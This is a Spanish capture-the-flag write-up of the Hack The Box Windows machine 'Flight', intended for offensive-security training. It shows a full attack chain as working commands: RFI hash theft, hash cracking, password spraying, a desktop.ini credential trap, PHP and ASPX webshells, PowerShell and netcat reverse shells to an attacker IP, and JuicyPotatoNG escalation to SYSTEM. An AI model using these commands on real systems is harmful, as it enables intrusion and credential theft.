Write up de la maquina flight de la plataforma de Hack The Box, la cual es una maquina windows de dificultad dificil.

![](/assets/img/flight/machine.png)
## Enumeracion
Empezemos haciendo un escaneo de puertos a la maquina victima
```bash
❯ nmap 10.10.11.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 12:25 -05
Nmap scan report for 10.10.11.187
Host is up (0.097s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos-sec
135/tcp open  msrpc
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd5
593/tcp open  http-rpc-epmap
636/tcp open  ldapssl
5985/tcp  open  http 
9389/tcp  open  mc-nm
49667/tcp open  msrpc
49673/tcp open  ncacn
49674/tcp open  msrpc
49690/tcp open  msrpc
49699/tcp open  msrpc
```
Intentemos detectar la version que corre para cada puerto
```bash
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,5985,9389,49667,49673,49674,49690,49699 10.10.11.187 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 12:41 -05
Nmap scan report for 10.10.11.187
Host is up (0.097s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-13 00:43:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Podemos ver que la maquina tiene un domio flight.htb incorporemos este dominio en el archivo /etc/hosts por si mas adelante enumeramos subdomminios.
```bash
❯ echo '10.10.11.187 flight.htb' >> /etc/hosts
```
Veamos la pagina web
![](/assets/img/flight/web.png)

Despues de enumerar un rato no encontre nada interesante en la web intentemos buscar sudmonios con gobuster.
```bash
❯ gobuster vhost -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://flight.htb/ --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://flight.htb/
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/02/12 12:53:50 Starting gobuster in VHOST enumeration mode
===============================================================
Found: school.flight.htb (Status: 200) [Size: 3996]
                                                       
===============================================================
2023/02/12 12:55:48 Finished
===============================================================
```
Y encontramos un subdominio school.flight.htb agregemoslo al /etc/hosts.

```bash
echo '10.10.11.187 school.flight.htb' >> /etc/hosts
```

Ingresemos a este subdominio para ver su contenido Y vemos que es una web diferente a la principal.
![](/assets/img/flight/sub.png)

Si le damos clip en el home que nos aparece en la parte superior izquierda podemos ver algo muy interesante en la forma en la que llama al archivo
![](/assets/img/flight/exp.png)

Veamos si la web es vulnerable a un lfi, despues de un rato de intentar bypasear las restrinciones que tiene la web, todas las consultas devuelve los mismo
![](/assets/img/flight/lfi.png) 
Vale la web esta sanitizada contra ataques de LFI pero veamos si tambien complentaron los RFI(remote file inclusion).

## Explotacion
Enviemos una peticion a la web para que se conecte a nuestro recurso a nivel de red.
```bash
❯ curl -s 'http://school.flight.htb/index.php?view=//10.10.14.88/smb/test.txt'
```
Montemos el servidor con smbserver.py y obtenemos el hash ntlmv2 comprabamos que la web es vulnerable a rfi intentemos desencryptar este hash para ver la contraseña en texto claro
```bash
❯ smbserver.py $(pwd) smb -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,50648)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:433989dafec2f6724733c11ebc131d6c:0101000000000000806bd1790e3fd9019811a57d6517a4f80000000001001000540046006500640057004a00410047000200100042007a006e006f00790047007500440003001000540046006500640057004a00410047000400100042007a006e006f00790047007500440007000800806bd1790e3fd90106000400020000000800300030000000000000000000000000300000890e5d74bb3af6ad9be69afc881e9cca474391f20cdfbea0dbf9d7405c709a600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380038000000000000000000
[*] Closing down connection (10.10.11.187,50648)
```

Metamos el hash en un archivo
```bash
❯ echo 'svc_apache::flight:aaaaaaaaaaaaaaaa:433989dafec2f6724733c11ebc131d6c:0101000000000000806bd1790e3fd9019811a57d6517a4f80000000001001000540046006500640057004a00410047000200100042007a006e006f00790047007500440003001000540046006500640057004a00410047000400100042007a006e006f00790047007500440007000800806bd1790e3fd90106000400020000000800300030000000000000000000000000300000890e5d74bb3af6ad9be69afc881e9cca474391f20cdfbea0dbf9d7405c709a600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380038000000000000000000' > hash
```
Usemos john para desencryptar el hash, y bueno tenemos credenciales
```bash
❯ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)
1g 0:00:00:13 DONE (2023-02-12 13:23) 0.07692g/s 820460p/s 820460c/s 820460C/s SADSDSDS..Ryaner89
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Podemos comprobar que las credenciales son correctas usando crackmapexec
```bash
❯ crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```
## Movimiento lateral
Teniendo credenciales validas podemos enumerar todos los usuarios del dominio atraves de rpcclient
```bash
❯ rpcclient 10.10.11.187 -U 'svc_apache%S@Ss!K@*t13' -c enumdomusers |grep -oP "\[.*?\]" |grep -v "0x" |tr -d '[]'
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```
Teniendo esta lista de usuarios podemos ver si la credencial que obtuvimos para svc_apcahe se reutiliza en algun usuario

Creamos el archivo con los usuarios
```bash
❯ cat users
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```
Y ejecutemos el ataque con crackmapexec, Vemos que la credencial es la misma para el usuario s.Moon
```bash
❯ crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```
Veamos que permisos tiene este usuario a nivel de recursos compartidos y podemos ver que  tiene capacidad de escritura en el recurso compartido Shared
```bash
❯ smbmap -H 10.10.11.187 -u 's.moon' -p 'S@Ss!K@*t13'
[+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	
```

creemos un archivo e intentemos subirlo

```bash
❯ whoami > test.txt
```
Conectemosnos con smbclient al servidor y subamos el archivo
```bash
❯ smbclient //10.10.11.187/Shared -U 's.moon%S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> put test.txt
NT_STATUS_ACCESS_DENIED opening remote file \test.txt
```
Y nos dice acceso denegado pero es raro ya que el smbmap nos reporto que teniamos capacidad de escritura, talvez se deba al tipo de extension del archivo esto para prevenir tal vez archivo .scf, pero si en lugar de un archivo .scf le subimos un archivo .ini probemos aver si tambien contemplan estos archivos
```bash
❯ whoami > test.ini
```
Intentemos subir este archivo
```bash
smb: \> put test.ini
putting file test.ini as \test.ini (0,0 kb/s) (average 0,0 kb/s)
smb: \>
```
Y vemos que este tipo de archivos si los acepta entonces si hay algun tipo de restricciones por detras pero se le ha escapado los archivos .ini, despues de unos minutos el archivo desaparece por lo que quiero pensar que hay alguien por detras que los esta revisando creemos un archivo .ini malicioso, el contenido de este archivo malicioso lo podemos sacar de [hacktricks](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini)

Archivo .ini
```bash
❯ cat desktop.ini
[.ShellClassInfo]
IconResource=\\10.10.14.88\aa
```
Subamos el archivo
```bash
smb: \> put desktop.ini
putting file Desktop.ini as \Desktop.ini (0,2 kb/s) (average 0,1 kb/s)
```
Pongamosnos en escucha de autenticaciones a nivel de red con el responder
```bash
❯ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.88]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-2RS3KXMQDXB]
    Responder Domain Name      [EUST.LOCAL]
    Responder DCE-RPC Port     [49285]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:9ee786ede7198767:29F7817B8C155C961EF8A2D85A25CA42:0101000000000000004400BEED3ED901A4358077FF6956490000000002000800450055005300540001001E00570049004E002D0032005200530033004B0058004D00510044005800420004003400570049004E002D0032005200530033004B0058004D0051004400580042002E0045005500530054002E004C004F00430041004C000300140045005500530054002E004C004F00430041004C000500140045005500530054002E004C004F00430041004C0007000800004400BEED3ED90106000400020000000800300030000000000000000000000000300000890E5D74BB3AF6AD9BE69AFC881E9CCA474391F20CDFBEA0DBF9D7405C709A600A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380038000000000000000000
```
Obtenemos el hash ntlmv2 del usuario c.bum intentemos decifrar este hash

Metamos el hash en un archivo
```bash
❯ cat hash
c.bum::flight.htb:695a5853a5c6ca10:7CA5F4767C3F2FAAC5EAF431B3A67726:0101000000000000004400BEED3ED901ED0D812DC8A38D310000000002000800450055005300540001001E00570049004E002D0032005200530033004B0058004D00510044005800420004003400570049004E002D0032005200530033004B0058004D0051004400580042002E0045005500530054002E004C004F00430041004C000300140045005500530054002E004C004F00430041004C000500140045005500530054002E004C004F00430041004C0007000800004400BEED3ED90106000400020000000800300030000000000000000000000000300000890E5D74BB3AF6AD9BE69AFC881E9CCA474391F20CDFBEA0DBF9D7405C709A600A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380038000000000000000000
```
Decifremos el hash con john
```bash
❯ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)
1g 0:00:00:22 DONE (2023-02-12 14:31) 0.04422g/s 466121p/s 466121c/s 466121C/s TinyPrincess..Theicon123
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Tenemos una nueva credencial para el usuario c.bum comprobemos que la credencial es correcta con crackmapexec
```bash
❯ crackmapexec smb 10.10.11.187 -u 'c.bum' -p 'Tikkycoll_431012284'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
```
Volvamos a ver permisos que tenemos en los recursos compartidos con estas nuevas credenciales
```bash
❯ smbmap -H 10.10.11.187 -u 'c.bum' -p 'Tikkycoll_431012284'
[+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ, WRITE	
```
Tenemos capacidad de escritura en un nuevo recurso compartido, Veamos el contenido de este recurso

Conectemosnos con smbclient
```bash
❯ smbclient //10.10.11.187/Web -U 'c.bum%Tikkycoll_431012284'
```
Listamos el contendio del directorio y vemos que hay dos directorios los nombres que tiene los directorios me llaman mucho la atencion ya que son los nombres del dominio principal y el subdominio.
```bash
smb: \> ls
  .                                   D        0  Sun Feb 12 21:37:24 2023
  ..                                  D        0  Sun Feb 12 21:37:24 2023
  flight.htb                          D        0  Sun Feb 12 21:37:01 2023
  school.flight.htb                   D        0  Sun Feb 12 21:37:01 2023

		5056511 blocks of size 4096. 1228356 blocks available
```
Si entramos al primer directorio podemos ver todos los archivos de configuracion de la pagina web 

```bash
smb: \> cd flight.htb\
smb: \flight.htb\> ls
  .                                   D        0  Sun Feb 12 21:37:01 2023
  ..                                  D        0  Sun Feb 12 21:37:01 2023
  css                                 D        0  Sun Feb 12 21:37:01 2023
  images                              D        0  Sun Feb 12 21:37:01 2023
  index.html                          A     7069  Thu Feb 24 00:58:10 2022
  js                                  D        0  Sun Feb 12 21:37:01 2023

		5056511 blocks of size 4096. 1228356 blocks available
```
Si vemos lo que nos reporta el wappalyzer podemos ver que el servidor interpreta php.
![](/assets/img/flight/php.png)

Creemos una webshell
```bash
❯ cat shell.php
<?php
  system($_REQUEST['cmd']);
?>
```
Y subamosla al servidor
```bash
smb: \flight.htb\> put shell.php
putting file shell.php as \flight.htb\shell.php (0,1 kb/s) (average 0,2 kb/s)
```
Ya podemos ejecutar comandos en el servidor
```bash
❯ curl -s 'http://flight.htb/shell.php?cmd=whoami'
flight\svc_apache
```
Para obtener una revershell voy a tirar de este script de [nishang](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) 

Descargo el script en mi maquina
```bash
❯ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
Para que al momento de interpretarse este script me envie directamente una revershell necesitamos meter una linea al final del script voy a cambiar el nombre a una mas pequeño como sh.ps1

Ya metiendo esto al momento en que se interprete todo el script de powershell me deberia enviar una consola al puerto 4444
```bash
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.88 -Port 4444' >> sh.ps1
```
Montamos un servidor con python3 en el mismo directorio del script de powershell
```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ejecutamos el comando en la maquina victima
```bash
❯ curl -s -X GET -G 'http://flight.htb/shell.php' --data-urlencode "cmd=cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.88/sh.ps1')"
```
Nos llega la peticion al servidor
```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.187 - - [12/Feb/2023 15:09:50] "GET /sh.ps1 HTTP/1.1" 200 -
```
Y estando en escucha por nc nos llega la revershell.

```bash
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.187] 50989
Windows PowerShell running as user svc_apache on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\flight.htb>
```
Como tenemos la contraseña de otros 2 usuarios migremos a el usuario C.Bum usando este binario de [runasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.4)
lo descargamos y extraemos los archivos del comprimido
```bash
❯ unzip  RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe 
```
Para transferir este archivo a la maquina victima voy a usar certutil.exe

Montamos un servidor en local
```bash
❯ sudo python3 -m http.server 80
```
En la maquina Victima nos vamos al directorio temp y nos descargamos el runasCs.exe
```bash
cd temp
certutil.exe -urlcache -f -split http://10.10.14.88/RunasCs.exe
****  Online  ****
  0000  ...
  c000
CertUtil: -URLCache command completed successfully.
```
Este binario necesita 3 argumentos el usuario, la contraseña y el comando lo ejecutamos y vemos que funciona
```bash
./RunasCs.exe c.bum Tikkycoll_431012284 whoami
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
flight\c.bum
```
Voy a enviarme una revershell como este usuario usando el mismo script de nishang que ya tenemos descargado

Montamos el servidor en local
```bash
❯ sudo python3 -m http.server 80
```
Y en la maquina victima ejecutemos el comando
```bash
./RunasCs.exe c.bum Tikkycoll_431012284 "cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.88/sh.ps1')"
```
Recibimos la revershell
```bash
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.187] 51063
Windows PowerShell running as user C.Bum on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
flight\c.bum
PS C:\Windows\system32> 
```
Para enumerar el sistema voy a tirar de [winpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20230212) Descargamos el binario y lo transferimos a la maquina victima con certutil 
```bash
certutil.exe -urlcache -f -split http://10.10.14.88/winPEASx64.exe
****  Online  ****
  000000  ...
  1e0c00
CertUtil: -URLCache command completed successfully.
```

Ejecutamos el winpeas, y vemos cosas interesante como el puerto 8000 que esta abierto solo internamente, ya que en el escaneo que hicismos al principio nmap no lo reporto como abierto
```bash

PS C:\temp> PS C:\temp> ./winPEASx64.exe

 Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         4580            httpd
  TCP        [::]                                        88            [::]                                        0               Listening         652             lsass
  TCP        [::]                                        135           [::]                                        0               Listening         916             svchost
  TCP        [::]                                        389           [::]                                        0               Listening         652             lsass
  TCP        [::]                                        443           [::]                                        0               Listening         4580            httpd
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        464           [::]                                        0               Listening         652             lsass
  TCP        [::]                                        593           [::]                                        0               Listening         916             svchost
  TCP        [::]                                        636           [::]                                        0               Listening         652             lsass
  TCP        [::]                                        3268          [::]                                        0               Listening         652             lsass
  TCP        [::]                                        3269          [::]                                        0               Listening         652             lsass
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        8000          [::]                                        0               Listening         4               System
  TCP        [::]                                        9389          [::]                                        0               Listening         2808            Microsoft.ActiveDirectory.WebServices
```
Si le mandamos un curl a este puerto podemos ver que tiene contenido 

```bash
curl.exe -s 127.0.0.1:8000 -I
HTTP/1.1 200 OK
Content-Length: 45949
Content-Type: text/html
Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
Accept-Ranges: bytes
ETag: "03cf42dc9d5d31:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Mon, 13 Feb 2023 04:02:53 GMT
```
Como desde nuestra maquina no tenemos acceso a este puerto vamos a tirar de [chisel](https://github.com/jpillora/chisel/releases/tag/v1.8.1) para aplicar un Remote Port Forwarding y poder acceder a este puerto desde mi maquina

Descargamos el binario comprimido y ahora vamos a descomprimir el archivo.
```bash
❯ gzip -d chisel_1.8.1_windows_amd64.gz
```
Los descargamos en la maquina victima
```bash
certutil.exe -urlcache -f -split http://10.10.14.88/chisel.exe
****  Online  ****
  000000  ...
  846600
CertUtil: -URLCache command completed successfully.
```
Vale para poder hacer el Remote Port Forwarding necesitamos tener en nuestra maquina un binario de chisel pero para linux.

Montemos un servidor en nuestra maquina con chisel para poder traernos ese puerto a nuestra maquina.
```bash
❯ ./chisel server -p 1234 --reverse
2023/02/12 16:16:35 server: Reverse tunnelling enabled
2023/02/12 16:16:35 server: Fingerprint +3ZK/P9BEzx+FGIsiYR72KCynYocE63VlI6oD7fBPZk=
2023/02/12 16:16:35 server: Listening on http://0.0.0.0:1234
```
Conectemosnos a este servidor desde la maquina windows 
```bash
./chisel.exe client 10.10.14.88:1234 R:8000:127.0.0.1:8000
```
Teniendo esta conecion podemos acceder al 127.0.0.1:8000 que no es nuestro puerto 8000 si no el puerto 8000 de la maquina victima
![](/assets/img/flight/ch.png)
 
Y vemos una web diferente a las otras que vimos antes si, accedemos a un recurso que no existe en la web se expone el directorio raiz de toda la web
```bash
❯ curl -s http://127.0.0.1:8000/hola |html2text |grep 'Path'
Physical Path    C:\inetpub\development\hola
```
Si nos vamos a este directorio desde la consola podemos ver que tenemos capacidad de escritura en este directorio
```bash
icacls .
. flight\C.Bum:(OI)(CI)(W)
  NT SERVICE\TrustedInstaller:(I)(F)
  NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
  BUILTIN\Administrators:(I)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(RX)
  BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\inetpub\development> 
```
Para comprobar los permisos que tenemos ejecutemos whoami y metasmos el output en un archivo
```bash
whoami > hola.txt
PS C:\inetpub\development> 
```
Comprobemos si esto se creo en el servidor y el archivo se creo.
![](/assets/img/flight/ho.png)

Tenemos capacidad de escritura, creemos una webshell voy a estar usando el cmd.aspx que viene con Seclists
```bash
❯ cp /usr/share/SecLists/Web-Shells/FuzzDB/cmd.aspx .
```

Descargamos el archivo en la maquina victima
```bash
certutil.exe -urlcache -f -split http://10.10.14.88/cmd.aspx
****  Online  ****
  0000  ...
  0b3e
CertUtil: -URLCache command completed successfully.
PS C:\inetpub\development> 
```
Accedamos a la web y veamos como quien estamos ejecutando comandos
![](/assets/img/flight/iis.png)
Mandemosnos una consola en donde operar mas comodos, para obtener la consola voy a ejecutar este comando en la webshell que tengo en el server y reutilizando el script de nishang
```bash
cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.88/sh.ps1')
```
Me pongo en escucha y recibo la consola
```bash
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.187] 51320
Windows PowerShell running as user G0$ on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```
## Escalada De Privelegios
Si miramos nuestros prilegios
```bash
whoami /priv

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
Como el SeImpersonatePrivilege esta en enable ya tenemos una via de escalar privelegios para explotar esto descarguemos el [JuicyPotato](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1) y lo descomprimimos

```bash
unzip JuicyPotatoNG.zip
Archive:  JuicyPotatoNG.zip
  inflating: JuicyPotatoNG.exe  
```
Ahora subamos este binario a la maquina victima
```bash
certutil.exe -urlcache -f -split http://10.10.14.88/JuicyPotatoNG.exe
****  Online  ****
  0000  ...
  0b3e
CertUtil: -URLCache command completed successfully.
```

Para enviarme una revershell voy a jugar con el nc.exe que trae el proyecto de seclists 
```bash
❯ cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
```
Lo descargo en la maquina victima
```bash
certutil.exe -urlcache -f -split http://10.10.14.88/nc.exe
```
y ejecuto el JuicyPotatoNG.exe

```bash
./JuicyPotatoNG.exe -t * -p "C:\temp\nc.exe" -a '10.10.14.88 4444 -e cmd'
```
Nos ponemos en escucha con nc y recibimos la consola como nt authority\system

```bash
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.187] 51430
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\>
```
Gracias Por leer
